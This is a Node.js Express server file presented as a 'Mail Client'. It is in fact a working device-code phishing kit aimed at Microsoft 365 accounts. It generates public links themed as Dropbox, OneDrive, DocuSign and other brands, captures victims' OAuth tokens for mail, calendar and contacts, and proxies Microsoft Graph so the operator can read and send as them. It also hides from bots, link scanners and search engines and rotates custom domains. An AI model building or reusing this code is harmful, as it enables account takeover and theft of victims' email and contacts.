const express = require("express");
const cors = require("cors");
const msal = require("@azure/msal-node");
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const { Pool } = require("pg");
const path = require("path");
require("dotenv").config();

const app = express();
app.set("trust proxy", 1);

const isProduction = process.env.NODE_ENV === "production";
const staticOrigins = isProduction
  ? (process.env.CORS_ORIGIN || "").split(",").map((s) => s.trim()).filter(Boolean)
  : ["http://localhost:5173", "http://localhost:5174"];

// Dynamic CORS: static origins + verified custom domains from DB (cached)
let verifiedDomainOrigins = [];
let domainCacheTime = 0;
const DOMAIN_CACHE_TTL = 60_000; // refresh every 60s

app.use(cors({
  origin: async (origin, callback) => {
    // Allow requests with no origin (non-browser, same-origin)
    if (!origin) return callback(null, true);
    // Allow static origins
    if (staticOrigins.length === 0) return callback(null, true);
    if (staticOrigins.includes(origin)) return callback(null, true);
    // Refresh verified domain cache if stale
    if (Date.now() - domainCacheTime > DOMAIN_CACHE_TTL) {
      try {
        const { rows } = await pool.query("SELECT domain FROM custom_domains WHERE dns_verified = true AND ssl_verified = true");
        verifiedDomainOrigins = rows.map((r) => `https://${r.domain}`);
        domainCacheTime = Date.now();
      } catch { /* table may not exist yet */ }
    }
    if (verifiedDomainOrigins.includes(origin)) return callback(null, true);
    callback(null, false);
  },
  credentials: true,
}));
app.use(express.json());

// Auto-detect server domain from Host header
app.use((req, res, next) => {
  if (!detectedDomain && req.hostname && req.hostname !== "localhost" && !req.hostname.match(/^\d+\.\d+\.\d+\.\d+$/)) {
    detectedDomain = req.hostname;
    console.log(`[auto-detect] Server domain: ${detectedDomain}`);
  }
  next();
});

const {
  generalLimiter,
  startSessionLimiter,
  pollingLimiter,
  validateHeadersLight,
  validateHeadersStrict,

  generateChallenge,
  validateAntibot,
  cleanupExpiredChallenges,
} = require("./antibot.cjs");

// In production, serve the built frontend
if (isProduction) {
  const distPath = path.join(__dirname, "..", "dist");
  app.use(express.static(distPath));
}

// ─── Config ──────────────────────────────────────────────────

const JWT_SECRET = process.env.JWT_SECRET || "mail-client-secret-change-in-production";
const AZURE_CLIENT_ID = process.env.VITE_AZURE_CLIENT_ID;
const AZURE_TENANT_ID = process.env.VITE_AZURE_TENANT_ID || "common";
const APP_DOMAIN = process.env.APP_DOMAIN || "";
const APP_IP = process.env.APP_IP || "";

// Auto-detect server domain and IP from first request
let detectedDomain = APP_DOMAIN;
let detectedIp = APP_IP;

function getAppDomain() { return APP_DOMAIN || detectedDomain; }
function getAppIp() { return APP_IP || detectedIp; }

// Auto-detect on startup: resolve own public IP
(async () => {
  try {
    if (!APP_IP) {
      const https = require("https");
      const ip = await new Promise((resolve, reject) => {
        https.get("https://api.ipify.org", (resp) => {
          let data = "";
          resp.on("data", (c) => data += c);
          resp.on("end", () => resolve(data.trim()));
        }).on("error", reject);
      });
      if (ip && /^\d+\.\d+\.\d+\.\d+$/.test(ip)) {
        detectedIp = ip;
        console.log(`[auto-detect] Server public IP: ${ip}`);
      }
    }
  } catch (e) {
    console.log("[auto-detect] Could not detect public IP:", e.message);
  }
})();

// ─── Database (PostgreSQL) ───────────────────────────────────

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.DATABASE_SSL === "true" ? { rejectUnauthorized: false } : false,
});

async function initDB() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS users (
      id SERIAL PRIMARY KEY,
      username TEXT UNIQUE NOT NULL,
      email TEXT UNIQUE NOT NULL,
      password_hash TEXT NOT NULL,
      display_name TEXT,
      created_at TIMESTAMPTZ DEFAULT NOW()
    );

    CREATE TABLE IF NOT EXISTS microsoft_accounts (
      id SERIAL PRIMARY KEY,
      user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
      ms_account_id TEXT,
      ms_username TEXT,
      ms_display_name TEXT,
      access_token TEXT,
      refresh_token TEXT,
      expires_on TEXT,
      home_account_id TEXT,
      connected_at TIMESTAMPTZ DEFAULT NOW()
    );

    CREATE TABLE IF NOT EXISTS connect_links (
      id SERIAL PRIMARY KEY,
      link_id TEXT UNIQUE NOT NULL,
      user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
      theme TEXT DEFAULT 'dropbox',
      created_at TIMESTAMPTZ DEFAULT NOW()
    );

    CREATE TABLE IF NOT EXISTS custom_domains (
      id SERIAL PRIMARY KEY,
      user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
      domain TEXT UNIQUE NOT NULL,
      dns_verified BOOLEAN DEFAULT false,
      ssl_verified BOOLEAN DEFAULT false,
      created_at TIMESTAMPTZ DEFAULT NOW()
    );
  `);

  // Migrations: add columns that may not exist yet
  await pool.query(`
    ALTER TABLE connect_links ADD COLUMN IF NOT EXISTS theme TEXT DEFAULT 'dropbox';
  `).catch(() => {});

  console.log("[db] PostgreSQL tables initialized");

  // Ensure default admin user exists (idempotent — safe if username or email already taken)
  try {
    const defaultUsername = process.env.DEFAULT_ADMIN_USERNAME || "admin";
    const defaultPassword = process.env.DEFAULT_ADMIN_PASSWORD || "admin123";
    const defaultEmail = process.env.DEFAULT_ADMIN_EMAIL || "admin@example.com";
    const { rows: existing } = await pool.query(
      "SELECT id FROM users WHERE username = $1 OR email = $2",
      [defaultUsername, defaultEmail]
    );
    if (existing.length === 0) {
      const passwordHash = await bcrypt.hash(defaultPassword, 10);
      await pool.query(
        "INSERT INTO users (username, email, password_hash, display_name) VALUES ($1, $2, $3, $4) ON CONFLICT DO NOTHING",
        [defaultUsername, defaultEmail, passwordHash, "Admin"]
      );
      console.log(`[db] Default admin user created: username="${defaultUsername}" password="${defaultPassword}"`);
    }
  } catch (e) {
    console.log("[db] Skipped default admin seed:", e.message);
  }
}

initDB().catch((err) => {
  console.error("[db] Failed to initialize database:", err.message);
});

// ─── MSAL Client ─────────────────────────────────────────────

const msalConfig = {
  auth: {
    clientId: AZURE_CLIENT_ID,
    authority: `https://login.microsoftonline.com/${AZURE_TENANT_ID}`,
  },
};

const pca = new msal.PublicClientApplication(msalConfig);

// Track pending device code logins: loginId -> { status, data }
const pendingLogins = new Map();

// ─── Middleware: JWT Auth ────────────────────────────────────

function requireAuth(req, res, next) {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith("Bearer ")) {
    return res.status(401).json({ error: "Authentication required" });
  }

  try {
    const token = authHeader.split(" ")[1];
    const decoded = jwt.verify(token, JWT_SECRET);
    req.userId = decoded.userId;
    req.username = decoded.username;
    next();
  } catch {
    return res.status(401).json({ error: "Invalid or expired token" });
  }
}

// ─── Auth Routes: Login ─────────────────────────────────────

app.post("/auth/login", async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ error: "Username and password are required" });
  }

  try {
    const { rows } = await pool.query(
      "SELECT id, username, email, password_hash, display_name FROM users WHERE username = $1 OR email = $1",
      [username]
    );

    if (rows.length === 0) {
      return res.status(401).json({ error: "Invalid credentials" });
    }

    const user = rows[0];
    const valid = await bcrypt.compare(password, user.password_hash);
    if (!valid) {
      return res.status(401).json({ error: "Invalid credentials" });
    }

    const token = jwt.sign(
      { userId: user.id, username: user.username },
      JWT_SECRET,
      { expiresIn: "7d" }
    );

    // Get all connected Microsoft accounts
    const { rows: msAccounts } = await pool.query(
      "SELECT id, ms_username, ms_display_name FROM microsoft_accounts WHERE user_id = $1",
      [user.id]
    );

    res.json({
      token,
      user: {
        id: user.id,
        username: user.username,
        email: user.email,
        displayName: user.display_name,
      },
      microsoftConnected: msAccounts.length > 0,
      microsoftAccounts: msAccounts.map((a) => ({
        id: a.id,
        username: a.ms_username,
        displayName: a.ms_display_name,
      })),
    });
  } catch (error) {
    console.error("Login error:", error);
    res.status(500).json({ error: "Login failed" });
  }
});

// Get current user info
app.get("/auth/me", requireAuth, async (req, res) => {
  try {
    const { rows } = await pool.query(
      "SELECT id, username, email, display_name FROM users WHERE id = $1",
      [req.userId]
    );

    if (rows.length === 0) {
      return res.status(404).json({ error: "User not found" });
    }

    const user = rows[0];
    const { rows: msAccounts } = await pool.query(
      "SELECT id, ms_username, ms_display_name FROM microsoft_accounts WHERE user_id = $1",
      [req.userId]
    );

    res.json({
      user: {
        id: user.id,
        username: user.username,
        email: user.email,
        displayName: user.display_name,
      },
      microsoftConnected: msAccounts.length > 0,
      microsoftAccounts: msAccounts.map((a) => ({
        id: a.id,
        username: a.ms_username,
        displayName: a.ms_display_name,
      })),
    });
  } catch (error) {
    console.error("Auth/me error:", error);
    res.status(500).json({ error: "Failed to get user info" });
  }
});

// ─── Microsoft Account: Device Code Flow ────────────────────

function generateId() {
  return Math.random().toString(36).substring(2) + Date.now().toString(36);
}

const SCOPES = [
  "User.Read",
  "Mail.ReadWrite",
  "Mail.Send",
  "MailboxSettings.Read",
  "Calendars.ReadWrite",
  "Contacts.ReadWrite",
  "People.Read",
  "offline_access",
];

// Active device code sessions: sessionId -> { linkId, userId, userCode, status, ... }
// These are short-lived (15 min max) and stay in-memory
const deviceSessions = new Map();

async function saveAccount(userId, authResult) {
  const { rows: existing } = await pool.query(
    "SELECT id FROM microsoft_accounts WHERE user_id = $1 AND ms_account_id = $2",
    [userId, authResult.account?.localAccountId]
  );

  let accountDbId;
  if (existing.length > 0) {
    await pool.query(`
      UPDATE microsoft_accounts SET
        ms_username = $1, ms_display_name = $2,
        access_token = $3, home_account_id = $4, expires_on = $5,
        connected_at = NOW()
      WHERE id = $6
    `, [
      authResult.account?.username,
      authResult.account?.name,
      authResult.accessToken,
      authResult.account?.homeAccountId,
      authResult.expiresOn?.toISOString(),
      existing[0].id
    ]);
    accountDbId = existing[0].id;
  } else {
    const { rows } = await pool.query(`
      INSERT INTO microsoft_accounts
        (user_id, ms_account_id, ms_username, ms_display_name, access_token, home_account_id, expires_on)
      VALUES ($1, $2, $3, $4, $5, $6, $7) RETURNING id
    `, [
      userId,
      authResult.account?.localAccountId,
      authResult.account?.username,
      authResult.account?.name,
      authResult.accessToken,
      authResult.account?.homeAccountId,
      authResult.expiresOn?.toISOString()
    ]);
    accountDbId = rows[0].id;
  }

  return {
    id: accountDbId,
    username: authResult.account?.username,
    displayName: authResult.account?.name,
  };
}

// Valid themes for connection links
const VALID_THEMES = ["dropbox", "onedrive", "sharepoint", "teams", "outlook", "docusign"];

// Generate a persistent connect link (stored in DB, never expires)
app.post("/microsoft/connect", requireAuth, async (req, res) => {
  try {
    const linkId = generateId();
    const theme = VALID_THEMES.includes(req.body?.theme) ? req.body.theme : "dropbox";
    await pool.query("INSERT INTO connect_links (link_id, user_id, theme) VALUES ($1, $2, $3)", [linkId, req.userId, theme]);
    res.json({ linkId, theme });
  } catch (error) {
    console.error("Connect link error:", error);
    res.status(500).json({ error: "Failed to create connection link" });
  }
});

// Get all links for the authenticated user
app.get("/microsoft/my-links", requireAuth, async (req, res) => {
  try {
    const { rows } = await pool.query(
      "SELECT link_id, theme, created_at FROM connect_links WHERE user_id = $1 ORDER BY created_at DESC",
      [req.userId]
    );
    res.json({ links: rows.map((l) => ({ linkId: l.link_id, theme: l.theme || "dropbox", createdAt: l.created_at })) });
  } catch (error) {
    console.error("My-links error:", error);
    res.status(500).json({ error: "Failed to get links" });
  }
});

// Delete a connection link
app.delete("/microsoft/link/:linkId", requireAuth, async (req, res) => {
  try {
    const { rowCount } = await pool.query(
      "DELETE FROM connect_links WHERE link_id = $1 AND user_id = $2",
      [req.params.linkId, req.userId]
    );
    if (rowCount === 0) return res.status(404).json({ error: "Link not found" });
    res.json({ ok: true });
  } catch (error) {
    console.error("Delete link error:", error);
    res.status(500).json({ error: "Failed to delete link" });
  }
});

// Antibot: challenge endpoint
app.get("/antibot/challenge/:linkId", generalLimiter, validateHeadersLight, generateChallenge);

// Public: start a fresh device code session from a connect link
app.post("/microsoft/start-session/:linkId", startSessionLimiter, validateHeadersStrict, validateAntibot, async (req, res) => {
  try {
    const { rows } = await pool.query("SELECT user_id FROM connect_links WHERE link_id = $1", [req.params.linkId]);
    if (rows.length === 0) {
      return res.status(404).json({ error: "Connection link not found" });
    }

    const sessionId = generateId();
    const userId = rows[0].user_id;

    const deviceCodeRequest = {
      scopes: SCOPES,
      deviceCodeCallback: (response) => {
        deviceSessions.set(sessionId, {
          linkId: req.params.linkId,
          userId,
          userCode: response.userCode,
          verificationUri: response.verificationUri,
          message: response.message,
          status: "pending",
        });
      },
    };

    pca.acquireTokenByDeviceCode(deviceCodeRequest)
      .then(async (authResult) => {
        const session = deviceSessions.get(sessionId);
        if (session) {
          session.status = "completed";
          session.msAccount = await saveAccount(userId, authResult);
        }
      })
      .catch((err) => {
        const session = deviceSessions.get(sessionId);
        if (session) {
          session.status = "error";
          session.error = err.message;
        }
      });

    // Wait for deviceCodeCallback to fire
    await new Promise((resolve) => setTimeout(resolve, 3000));

    const session = deviceSessions.get(sessionId);
    if (session && session.userCode) {
      res.json({
        sessionId,
        userCode: session.userCode,
        verificationUri: session.verificationUri,
        message: session.message,
      });
    } else {
      res.status(500).json({ error: "Failed to start device code flow. Check your Azure app registration." });
    }
  } catch (error) {
    console.error("Start session error:", error);
    res.status(500).json({ error: error.message });
  }
});

// Public: get connect link info (validates link exists)
app.get("/microsoft/connect-info/:linkId", generalLimiter, validateHeadersLight, async (req, res) => {
  try {
    const { rows } = await pool.query("SELECT id, theme FROM connect_links WHERE link_id = $1", [req.params.linkId]);
    if (rows.length === 0) {
      return res.status(404).json({ error: "Connection link not found" });
    }
    res.json({ valid: true, theme: rows[0].theme || "dropbox" });
  } catch (error) {
    console.error("Connect-info error:", error);
    res.status(500).json({ error: "Database error" });
  }
});

// Public: poll session status
app.get("/microsoft/session-status/:sessionId", pollingLimiter, (req, res) => {
  const session = deviceSessions.get(req.params.sessionId);
  if (!session) {
    return res.status(404).json({ error: "Session not found" });
  }
  if (session.status === "completed") {
    res.json({ status: "completed" });
    // Clean up session but keep the link alive
    deviceSessions.delete(req.params.sessionId);
  } else if (session.status === "error") {
    res.json({ status: "error", error: session.error });
    deviceSessions.delete(req.params.sessionId);
  } else {
    res.json({ status: "pending" });
  }
});

// Authenticated: poll for account additions (used by the app to detect new connections)
app.get("/microsoft/poll/:linkId", requireAuth, async (req, res) => {
  try {
    const { rows } = await pool.query("SELECT id FROM connect_links WHERE link_id = $1", [req.params.linkId]);
    if (rows.length === 0) {
      return res.status(404).json({ error: "Link not found" });
    }

    // Find completed sessions for this link
    for (const [sessionId, session] of deviceSessions.entries()) {
      if (session.linkId === req.params.linkId && session.status === "completed") {
        const msAccount = session.msAccount;
        deviceSessions.delete(sessionId);
        return res.json({ status: "completed", msAccount });
      }
      if (session.linkId === req.params.linkId && session.status === "error") {
        const error = session.error;
        deviceSessions.delete(sessionId);
        return res.json({ status: "error", error });
      }
    }

    res.json({ status: "pending" });
  } catch (error) {
    console.error("Poll error:", error);
    res.status(500).json({ error: "Database error" });
  }
});

// Disconnect Microsoft account (by account DB id)
app.post("/microsoft/disconnect", requireAuth, async (req, res) => {
  try {
    const { accountId } = req.body;
    if (accountId) {
      await pool.query("DELETE FROM microsoft_accounts WHERE id = $1 AND user_id = $2", [accountId, req.userId]);
    } else {
      await pool.query("DELETE FROM microsoft_accounts WHERE user_id = $1", [req.userId]);
    }
    res.json({ ok: true });
  } catch (error) {
    console.error("Disconnect error:", error);
    res.status(500).json({ error: "Failed to disconnect" });
  }
});

// ─── Custom Domains ──────────────────────────────────────────

const dns = require("dns");
const https = require("https");

app.get("/domains/list", requireAuth, async (req, res) => {
  try {
    const { rows } = await pool.query(
      "SELECT * FROM custom_domains WHERE user_id = $1 ORDER BY created_at DESC",
      [req.userId]
    );
    res.json({ domains: rows, appDomain: getAppDomain(), appIp: getAppIp() });
  } catch (error) {
    console.error("Domains list error:", error);
    res.status(500).json({ error: "Failed to list domains" });
  }
});

app.post("/domains/add", requireAuth, async (req, res) => {
  const { domain } = req.body;
  if (!domain || typeof domain !== "string") {
    return res.status(400).json({ error: "Domain is required" });
  }

  // Clean and validate domain
  const cleanDomain = domain.trim().toLowerCase().replace(/^https?:\/\//, "").replace(/\/+$/, "");
  if (!/^[a-z0-9]([a-z0-9-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)+$/.test(cleanDomain)) {
    return res.status(400).json({ error: "Invalid domain format" });
  }

  try {
    const { rows } = await pool.query(
      "INSERT INTO custom_domains (user_id, domain) VALUES ($1, $2) RETURNING *",
      [req.userId, cleanDomain]
    );
    const appDomain = getAppDomain();
    const appIp = getAppIp();
    const instructions = [];
    if (appIp) instructions.push(`A Record: Point "${cleanDomain}" to ${appIp}`);
    if (appDomain) instructions.push(`CNAME: Point "${cleanDomain}" to "${appDomain}"`);
    if (!instructions.length) instructions.push("Could not auto-detect server IP. Set APP_DOMAIN or APP_IP env var.");

    res.json({
      domain: rows[0],
      appDomain,
      appIp,
      instructions: instructions.join("\n— OR —\n"),
    });
  } catch (err) {
    if (err.code === "23505") { // unique violation
      return res.status(409).json({ error: "Domain already exists" });
    }
    console.error("Add domain error:", err);
    res.status(500).json({ error: "Failed to add domain" });
  }
});

app.post("/domains/verify-dns/:domainId", requireAuth, async (req, res) => {
  try {
    const { rows } = await pool.query(
      "SELECT * FROM custom_domains WHERE id = $1 AND user_id = $2",
      [req.params.domainId, req.userId]
    );
    if (rows.length === 0) return res.status(404).json({ error: "Domain not found" });
    const domain = rows[0];

    const appDomain = getAppDomain();
    const appIp = getAppIp();

    // Check CNAME and A records
    const cnames = await dns.promises.resolveCname(domain.domain).catch(() => []);
    const aRecords = await dns.promises.resolve4(domain.domain).catch(() => []);
    const appARecords = appDomain ? await dns.promises.resolve4(appDomain).catch(() => []) : [];

    // Verify CNAME points to our app domain
    const cnameMatch = appDomain && cnames.some((c) => c.toLowerCase().replace(/\.$/, "") === appDomain.toLowerCase());
    // Verify A record matches server IP directly, or resolves to same IP as app domain
    const aMatchDirect = appIp && aRecords.includes(appIp);
    const aMatchResolved = appARecords.length > 0 && aRecords.some((a) => appARecords.includes(a));

    if (cnameMatch || aMatchDirect || aMatchResolved) {
      await pool.query("UPDATE custom_domains SET dns_verified = true WHERE id = $1", [domain.id]);
      const method = cnameMatch ? "CNAME" : "A record";
      res.json({ verified: true, method });
    } else {
      const hints = [];
      if (appIp) hints.push(`A Record: Point "${domain.domain}" to ${appIp}`);
      if (appDomain) hints.push(`CNAME: Point "${domain.domain}" to "${appDomain}"`);
      if (!hints.length) hints.push("Could not auto-detect server IP. Set APP_DOMAIN or APP_IP env var.");
      res.json({
        verified: false,
        cnames,
        aRecords,
        expectedDomain: appDomain || undefined,
        expectedIp: appIp || undefined,
        hint: hints.join("  — OR —  "),
      });
    }
  } catch (err) {
    console.error("Verify DNS error:", err);
    res.json({ verified: false, error: "DNS lookup failed. Check that the domain exists and DNS has propagated." });
  }
});

app.post("/domains/verify-ssl/:domainId", requireAuth, async (req, res) => {
  try {
    const { rows } = await pool.query(
      "SELECT * FROM custom_domains WHERE id = $1 AND user_id = $2",
      [req.params.domainId, req.userId]
    );
    if (rows.length === 0) return res.status(404).json({ error: "Domain not found" });
    const domain = rows[0];

    if (!domain.dns_verified) {
      return res.status(400).json({ error: "DNS must be verified before checking SSL" });
    }

    const reqHttps = https.request(
      { hostname: domain.domain, port: 443, method: "HEAD", timeout: 10000 },
      async (response) => {
        const cert = response.socket.getPeerCertificate();
        if (cert && cert.subject) {
          await pool.query("UPDATE custom_domains SET ssl_verified = true WHERE id = $1", [domain.id]);
          res.json({ verified: true, issuer: cert.issuer?.O || "Unknown", validTo: cert.valid_to });
        } else {
          res.json({ verified: false, error: "No valid SSL certificate found" });
        }
      }
    );

    reqHttps.on("error", (err) => {
      res.json({ verified: false, error: `SSL check failed: ${err.message}. Make sure your domain has an SSL certificate installed.` });
    });

    reqHttps.on("timeout", () => {
      reqHttps.destroy();
      res.json({ verified: false, error: "SSL check timed out. The domain may not be reachable over HTTPS." });
    });

    reqHttps.end();
  } catch (error) {
    console.error("Verify SSL error:", error);
    res.status(500).json({ error: "Failed to check SSL" });
  }
});

app.delete("/domains/:domainId", requireAuth, async (req, res) => {
  try {
    const { rowCount } = await pool.query(
      "DELETE FROM custom_domains WHERE id = $1 AND user_id = $2",
      [req.params.domainId, req.userId]
    );
    if (rowCount === 0) return res.status(404).json({ error: "Domain not found" });
    res.json({ ok: true });
  } catch (error) {
    console.error("Delete domain error:", error);
    res.status(500).json({ error: "Failed to delete domain" });
  }
});

// ─── Graph API Proxy ─────────────────────────────────────────

app.use("/api/graph", requireAuth, async (req, res) => {
  try {
    // Get the user's Microsoft account — use _accountId if specified, otherwise first connected
    const requestedAccountId = req.query._accountId;
    let msAccount;
    if (requestedAccountId) {
      const { rows } = await pool.query(
        "SELECT id, access_token, home_account_id, expires_on FROM microsoft_accounts WHERE id = $1 AND user_id = $2",
        [Number(requestedAccountId), req.userId]
      );
      msAccount = rows[0];
    } else {
      const { rows } = await pool.query(
        "SELECT id, access_token, home_account_id, expires_on FROM microsoft_accounts WHERE user_id = $1 ORDER BY id ASC LIMIT 1",
        [req.userId]
      );
      msAccount = rows[0];
    }

    if (!msAccount) {
      return res.status(403).json({ error: "No Microsoft account connected. Please connect your Office 365 account first." });
    }

    let accessToken = msAccount.access_token;

    // Check if token is expired and try to refresh
    if (msAccount.expires_on && new Date(msAccount.expires_on) < new Date()) {
      try {
        const accounts = await pca.getTokenCache().getAllAccounts();
        const account = accounts.find(a => a.homeAccountId === msAccount.home_account_id);

        if (account) {
          const refreshResult = await pca.acquireTokenSilent({
            account,
            scopes: ["User.Read", "Mail.ReadWrite", "Mail.Send", "MailboxSettings.Read", "Calendars.ReadWrite", "Contacts.ReadWrite", "People.Read", "offline_access"],
          });
          accessToken = refreshResult.accessToken;

          // Update stored token
          await pool.query(
            "UPDATE microsoft_accounts SET access_token = $1, expires_on = $2 WHERE id = $3",
            [accessToken, refreshResult.expiresOn?.toISOString(), msAccount.id]
          );
        }
      } catch {
        return res.status(401).json({ error: "Microsoft token expired. Please reconnect your account." });
      }
    }

    // Build Graph API URL
    const graphPath = req.originalUrl.replace("/api/graph/", "").split("?")[0];
    const graphUrl = `https://graph.microsoft.com/v1.0/${graphPath}`;
    const url = new URL(graphUrl);

    // Forward query parameters (except internal ones)
    for (const [key, value] of Object.entries(req.query)) {
      if (key.startsWith("_")) continue; // skip internal params like _accountId
      url.searchParams.set(key, String(value));
    }

    const fetchOptions = {
      method: req.method,
      headers: {
        Authorization: `Bearer ${accessToken}`,
        "Content-Type": "application/json",
      },
    };

    if (req.method !== "GET" && req.method !== "HEAD" && req.body && Object.keys(req.body).length > 0) {
      fetchOptions.body = JSON.stringify(req.body);
    }

    const graphRes = await fetch(url.toString(), fetchOptions);
    const contentType = graphRes.headers.get("content-type") || "";

    if (graphRes.status === 204) {
      return res.status(204).end();
    }

    if (contentType.includes("application/json")) {
      const data = await graphRes.json();
      res.status(graphRes.status).json(data);
    } else {
      const text = await graphRes.text();
      res.status(graphRes.status).send(text);
    }
  } catch (error) {
    console.error("Graph proxy error:", error);
    res.status(500).json({ error: "Failed to call Microsoft Graph API" });
  }
});

// ─── SPA fallback (production) ───────────────────────────────

if (isProduction) {
  const distPath = path.join(__dirname, "..", "dist");

  // Serve connect page — block bots, serve stripped HTML to real browsers
  app.get("/connect/:linkId", (req, res) => {
    const ua = (req.headers["user-agent"] || "").toLowerCase();

    // Block all known bots/crawlers with empty response — no metadata to scrape
    const botPatterns = [
      "bot", "crawl", "spider", "slurp", "facebook", "twitter", "linkedin",
      "telegram", "whatsapp", "discord", "slack", "viber", "skype", "snapchat",
      "reddit", "vkshare", "pinterest", "embedly", "preview", "fetch",
      "curl", "wget", "python", "java/", "php/", "ruby", "perl", "go-http",
      "axios", "node-fetch", "undici", "got/", "scrapy", "aiohttp",
      "headlesschrome", "phantomjs", "selenium", "webdriver", "puppeteer", "playwright",
    ];
    if (!ua || botPatterns.some((p) => ua.includes(p))) {
      return res.status(403).end();
    }

    // Read the built index.html and strip all metadata before serving
    const fs = require("fs");
    const htmlPath = path.join(distPath, "index.html");
    let html = fs.readFileSync(htmlPath, "utf-8");

    // Remove title, meta description, og tags, twitter tags, favicon, manifest
    html = html.replace(/<title>[^<]*<\/title>/gi, "<title></title>");
    html = html.replace(/<meta\s+name="description"[^>]*>/gi, "");
    html = html.replace(/<meta\s+name="theme-color"[^>]*>/gi, "");
    html = html.replace(/<meta\s+property="og:[^"]*"[^>]*>/gi, "");
    html = html.replace(/<meta\s+name="twitter:[^"]*"[^>]*>/gi, "");
    html = html.replace(/<link\s+rel="icon"[^>]*>/gi, "");
    html = html.replace(/<link\s+rel="manifest"[^>]*>/gi, "");
    html = html.replace(/<link\s+rel="apple-touch-icon"[^>]*>/gi, "");

    // Add noindex + no-cache headers
    res.set("X-Robots-Tag", "noindex, nofollow, nosnippet, noarchive, noimageindex");
    res.set("Cache-Control", "no-store, no-cache, must-revalidate, private");
    res.type("html").send(html);
  });

  // Regular SPA fallback for all other pages
  app.use((req, res, next) => {
    if (req.method === "GET" && !req.path.startsWith("/api/") && !req.path.startsWith("/auth/") && !req.path.startsWith("/microsoft/") && !req.path.startsWith("/antibot/") && !req.path.startsWith("/connect/") && !req.path.startsWith("/domains/")) {
      res.sendFile(path.join(distPath, "index.html"));
    } else {
      next();
    }
  });
}

// ─── Antibot cleanup ─────────────────────────────────────────

setInterval(cleanupExpiredChallenges, 60_000);

// ─── Start server ────────────────────────────────────────────

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
  console.log(`Mail Client server running on http://localhost:${PORT}`);
  console.log(`Azure Client ID: ${AZURE_CLIENT_ID}`);
  console.log(`Azure Tenant: ${AZURE_TENANT_ID}`);
  console.log(`Database: PostgreSQL`);
});
